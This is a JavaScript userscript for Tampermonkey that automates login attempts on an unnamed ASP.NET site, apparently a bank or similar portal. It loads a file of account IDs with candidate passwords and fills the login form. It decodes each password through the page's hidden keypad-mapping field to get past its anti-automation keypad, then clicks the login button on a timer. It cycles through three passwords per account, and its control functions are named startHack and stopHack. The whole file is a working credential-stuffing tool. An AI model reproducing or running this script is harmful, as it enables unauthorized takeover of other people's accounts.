//use tampermonkey to load

// ==UserScript==
// @name         Script
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  CC 
// @author       ""
// @match        "webpage" https://.......
// @grant        none
// @require      http://code.jquery.com/jquery-3.3.1.min.js

// ==/UserScript==

var $ = window.jQuery;
(function() {
    'use strict';

    var States = {
        OFF: '0',
        READY: '1',
        RUNNING: '2',
        STOP: '3'
    };
//UI
var windowDiv, subDiv;
var clienteActual,serialClienteActual;
var claveActual, textFieldClave;
var loadFile, cargarData, stopButton, saveFile;
var checkbox;
var userIDList;
var op1,op2;

var userPassList;

const keytextFieldStartValue = 'keytextFieldStartValue';
var textFieldStartValue = sessionStorage.getItem(keytextFieldStartValue);
const keytextFieldEndValue = 'keytextFieldEndValue';
var textFieldEndValue = sessionStorage.getItem(keytextFieldEndValue);
//state variable
const keyState = 'keyState';
var state = sessionStorage.getItem(keyState);

//clientes cargados, variable centinela, password Actual
//variable final e inicial tomados del par de textfield
const keyClientes = "arrayClient"; //llave de la variable
var arregloClientes = JSON.parse(sessionStorage.getItem(keyClientes));
const keyCentinel = 'keyCentinel'; //llave de la variable
var centinel = Number(sessionStorage.getItem(keyCentinel));
const keypassword = 'keypassword'; //llave de la variable
var currentpassword = Number(sessionStorage.getItem(keypassword));
const keyIterationNumber = "keyIteration"
var IterationNumber = Number(sessionStorage.getItem(keyIterationNumber));






createUI();

if(state == null){
    state = States.OFF;
    saveState();
    initCurrentpassword(0);
    arregloClientes = [];
}
else if(state === States.RUNNING){
    clientPassword();
}
else if(state === States.STOP){
}
function startHack(){
    //saveTextFieldsValue();
    state = States.RUNNING;
    saveState();
    cargarFormularioWeb();
    userIDList.value = centinel;
    clientPassword();

}
function stopHack(){
    state = States.STOP;
    saveState();
}

function createUI() {

var grid_container_style = "display: inline-grid;" +
                       "grid-template-columns: auto auto;" +
                       "background-color: #808000;padding: 10px;";

var grid_style = "background-color: rgba(255, 255, 255, 0.8);" +
             "border: 1px solid rgba(0, 0, 0, 0.8);" +
             "padding: 2px; font-size: 16px; text-align: center;";

var elementArray = [];
windowDiv = document.createElement('div');
//document.body.appendChild(windowDiv);
windowDiv.setAttribute("style", grid_container_style);
windowDiv.style.cssFloat = "left";

clienteActual = document.createElement('label');
clienteActual.textContent = 'Inicio';
clienteActual.style.margin = '0 5px 0 0';

serialClienteActual = document.createElement('input');
serialClienteActual.type = 'text';
serialClienteActual.size = '4';
serialClienteActual.value = textFieldStartValue;

loadFile = document.createElement('input');
loadFile.id = 'loadFile';
loadFile.type = 'file';
loadFile.name = "archivo";
loadFile.style.color = "transparent";
loadFile.addEventListener("click", botonpresionado, false);

function botonpresionado() {
  console.log("Se presionó: " + this.id);

    if(this.id=="start"){
     console.log("clicked...waiting...");


    setTimeout(
        function() {
          console.log("en 5segundos te redirecciona...");
          document.getElementsByName("ctl00$DefaultContent$imgIngresar")[0].click()
        },
        5000);





    }
      //      document.getElementsByName("ctl00$DefaultContent$imgIngresar")[0].click()

}
loadFile.style.width = browser();
//aqui empezamos a repetir el proceso

loadFile.addEventListener('change',function (){

    var reader = new FileReader();

    reader.onload = function () {
        arregloClientes = [];
        alert("SISISI");
        let foo = (this.result).split(" ").join("");
        for(let i of foo.split('\n')){
            let cad = (i.split(","));
            if(Number(cad[0]) !== 0 && Number(cad[1]) !== 0){
                let userid = cad[0];
                cad.splice(0, 1)
                arregloClientes.push( new Client(userid,cad) );
            }
        }
        if(arregloClientes.length > 0){
            console.log(arregloClientes);
            state = States.READY;
            saveIterationNumber(arregloClientes.length);
            saveState();
            saveArray();
            initCentinel();
            clientList();
            clientPassword();
            $( "#start" ).click();
        //    document.getElementsByName("ctl00$DefaultContent$imgIngresar")[0].click()
        }
    }
    reader.readAsText(this.files[0]);
    loadFile.value = null;
});

elementArray.push(loadFile);
//windowDiv.appendChild(loadFile);

cargarData = document.createElement("button");
cargarData.addEventListener('click',startHack);
cargarData.id = "start";
cargarData.textContent = "Cargar Data";
cargarData.type = "button";
cargarData.addEventListener("click", botonpresionado, false);
//startButton.disabled = true;
elementArray.push(cargarData);

userIDList = document.createElement("select");
userIDList.id= "usuario";
userIDList.addEventListener('change',function () {
    centinel = this.options[this.selectedIndex].value;
    saveCentinel();
    initCurrentpassword(0);
    clientPassword();

});
op1 = document.createElement("option");
op1.textContent = "Clientes";
op1.value = -1;
userIDList.appendChild(op1);

var selectDiv = document.createElement('div');

var clientetext = document.createTextNode("Clientes");
selectDiv.appendChild(clientetext);
selectDiv.appendChild(userIDList);

elementArray.push(selectDiv);

subDiv = document.createElement('div');

userPassList = document.createElement("select");
userPassList.addEventListener('change',function () {
    currentpassword = this.options[this.selectedIndex].value;
    sessionStorage.setItem(keypassword,currentpassword);
});
op2 = document.createElement("option");
op2.textContent = "Claves";
op2.value = -1;
userPassList.appendChild(op2);
subDiv.appendChild(userPassList);
elementArray.push(subDiv);

//aqui
clienteActual = document.createElement('label');
clienteActual.textContent = 'Cliente Actual: ';
clienteActual.style.margin = '0 5px 0 0';

serialClienteActual = document.createElement('input');
serialClienteActual.type = 'text';
serialClienteActual.size = '14';
serialClienteActual.disabled = true;
serialClienteActual.id = "serialClienteActual";

var setdiv = document.createElement('div');
setdiv.appendChild(clienteActual);
setdiv.appendChild(document.createElement('br'));
setdiv.appendChild(serialClienteActual);
elementArray.push(setdiv);

claveActual = document.createElement('label');
claveActual.textContent = 'Clave Actual: ';
claveActual.style.margin = '0 5px 0 5px';

textFieldClave = document.createElement('input');
textFieldClave.type = 'text';
textFieldClave.size = '14';
textFieldClave.disabled = true;
textFieldClave.id = "textFieldClave";

setdiv = document.createElement('div');
setdiv.appendChild(claveActual);
setdiv.appendChild(document.createElement('br'));
setdiv.appendChild(textFieldClave);
elementArray.push(setdiv);

//aca
for(let i = 0; i < elementArray.length; ++i){
    let grid_item = document.createElement('div');
    grid_item.setAttribute("style",grid_style);
    grid_item.appendChild(elementArray[i]);
    windowDiv.appendChild(grid_item);
}
clientList();
//showClient();
clientPassword();

// var item = document.getElementById("LoginImage");
// item.parentNode.removeChild(item);

// var errorwindow = document.getElementById("ErrorMessage");
// errorwindow.parentNode.removeChild(errorwindow);

// var ermac = document.getElementById( 'LoginData' );
// ermac.parentNode.insertBefore( windowDiv, ermac.nextSibling );
// document.getElementById("MainLogin").style.marginLeft = 0;
// document.getElementById("LoginPanel").style.marginLeft = 0;

document.body.appendChild(windowDiv);
}

function showClient() {
    alert("sdfsdf");
    if(!(arregloClientes instanceof Array) || arregloClientes.length <= 0 ||
         centinel >= IterationNumber || centinel >= arregloClientes.length)
    {return;}

    subDiv.innerHTML += "Cliente " + centinel;
    var i = centinel;
    subDiv.innerHTML += "<br>user: " + arregloClientes[i].userID;
    for(let j = 0; j < arregloClientes[i].passwordList.length; ++j){
        subDiv.innerHTML += "<br>clave"+ j +": " + arregloClientes[i].passwordList[j];
    }

    subDiv.innerHTML += "<br>";
    if(currentpassword >= 0){
        subDiv.innerHTML += arregloClientes[i].passwordList[currentpassword];
    }
}

function cargarFormularioWeb() {
    let cli = arregloClientes[centinel].userID;
    let clave1 = arregloClientes[centinel].passwordList[currentpassword];
    let secret = document.getElementById("ctl00_DefaultContent_r").value;

    let tfSerialClient = document.getElementById("serialClienteActual");
    tfSerialClient.value = cli;
    let tfClave = document.getElementById("textFieldClave");
    tfClave.value = clave1;

    let arregloChanger = secret.split(',');

    let claveSecreta = buildPassword(clave1,arregloChanger);

    let nano = document.getElementById("ctl00_DefaultContent_txtIdentificacion");
    nano.value = cli;
    var nano2 = document.getElementById("ctl00_DefaultContent_txtPassword");
    nano2.type = 'text';
    nano2.value = claveSecreta;

    ++currentpassword;
    sessionStorage.setItem(keypassword,currentpassword);

    if(currentpassword === 3){
        ++centinel;
        if(centinel >= arregloClientes.length){
            centinel = 0;
        }
        sessionStorage.setItem(keyCentinel,centinel);
        initCurrentpassword(0);
    }
}

function buildPassword(password, arrChanger) {

    var newpass = "";
    var num = 0;
    for(let i = 0; i < password.length; ++i){
        for(let j = 0; j < arrChanger.length;++j){
            if(password.charAt(i) == arrChanger[j])
            {
                num = (j + 1);
                if(num == 10){
                    num = 0;
                }

                newpass += num;
                break;
            }
        }
    }
    return newpass;
}

function clientList(params) {

    if(arregloClientes === null || arregloClientes.length == 0){
       return;
    }

    while (userIDList.hasChildNodes()){
        userIDList.removeChild(userIDList.firstChild);
    }

    let cont = 0;
    for(let arr of arregloClientes){
        op1 = document.createElement("option");
        op1.textContent = arr.userID;
        op1.value = cont;
        if(cont == centinel){
            op1.setAttribute("selected","selected")
        }
        cont++;
        userIDList.appendChild(op1);
    }
}

function clientPassword(){
    if(arregloClientes === null || arregloClientes.length == 0){
        return;
    }

    while(userPassList.hasChildNodes()){
        userPassList.removeChild(userPassList.firstChild);
    }

    let cont = 0;
    for(let userpass of arregloClientes[centinel].passwordList){
        op2 = document.createElement("option");
        op2.textContent = userpass;
        op2.value = cont;

        if(cont == currentpassword){
            op2.setAttribute("selected","selected");
        }

        cont++;
        userPassList.appendChild(op2);
    }
    userPassList.setAttribute('multiple','multiple');
}

function browser() {
    var isOpera = (!!window.opr && !!opr.addons) || !!window.opera || navigator.userAgent.indexOf(' OPR/') >= 0;

    // Firefox 1.0+
    var isFirefox = typeof InstallTrigger !== 'undefined';
    if(isFirefox)
        return '85px';
    // Safari 3.0+ "[object HTMLElementConstructor]"
    var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || (typeof safari !== 'undefined' && safari.pushNotification));

    // Internet Explorer 6-11
    var isIE = /*@cc_on!@*/false || !!document.documentMode;

    // Edge 20+
    var isEdge = !isIE && !!window.StyleMedia;
    if(isEdge)
        return '120px';
    // Chrome 1+
    var isChrome = !!window.chrome && !!window.chrome.webstore;
    if(isChrome)
        return '130px';

    return '120px';
}

function Client(userID, passwordList) {
    this.userID = userID;
    this.passwordList = [];
    if(passwordList instanceof Array)
        this.passwordList = passwordList;
}

function stateHandler(nextState) {
    switch (nextState) {
        case States.OFF:
            break;
        case States.RUNNING:
            break;
        case States.STOP:
            break;
        case States.READY:
            break;
        default:
            break;
    }
}

function saveTextFieldsValue() {
    textFieldStartValue = serialClienteActual.value;
    sessionStorage.setItem(keytextFieldStartValue, textFieldStartValue);
    textFieldEndValue = textFieldClave.value;
    sessionStorage.setItem(keytextFieldEndValue, textFieldEndValue);
}

function saveIterationNumber(num) {
    IterationNumber = num;
    sessionStorage.setItem(keyIterationNumber,IterationNumber);
}

function saveState() {
    sessionStorage.setItem(keyState,state);
}
function saveArray(){
    sessionStorage.setItem(keyClientes,JSON.stringify(arregloClientes));
}
function initCentinel() {
    centinel = 0;
    sessionStorage.setItem(keyCentinel,centinel);
}

function saveCentinel() {
    sessionStorage.setItem(keyCentinel,centinel);
}

function initCurrentpassword(currentp) {
    currentpassword = Number(currentp);
    sessionStorage.setItem(keypassword,currentpassword);
}

function validate(evt) {
    var theEvent = evt || window.event;
    // Handle paste
    if (theEvent.type === 'paste') {
        key = event.clipboardData.getData('text/plain');
    } else {
    // Handle key press
        var key = theEvent.keyCode || theEvent.which;
        key = String.fromCharCode(key);
    }
    var regex = /[0-9]|\./;
    if( !regex.test(key) ) {
        theEvent.returnValue = false;
        if(theEvent.preventDefault) theEvent.preventDefault();
    }
}

function checkInp(textElement){
    if (isNaN(textElement.value) || textElement.value === ''){
        return false;
    }
    return true;
}
    //iniciador
      if($('#usuario').val() != '-1'){
      console.log('iniciando');
            setTimeout(
        function() {
          console.log("en 5segundos te redirecciona...");
$( "#start" ).click();
        },
        5000);
   }

    if($('#usuario').val() == '-1'){
      console.log('esperando que presione boton entrar');}

})();
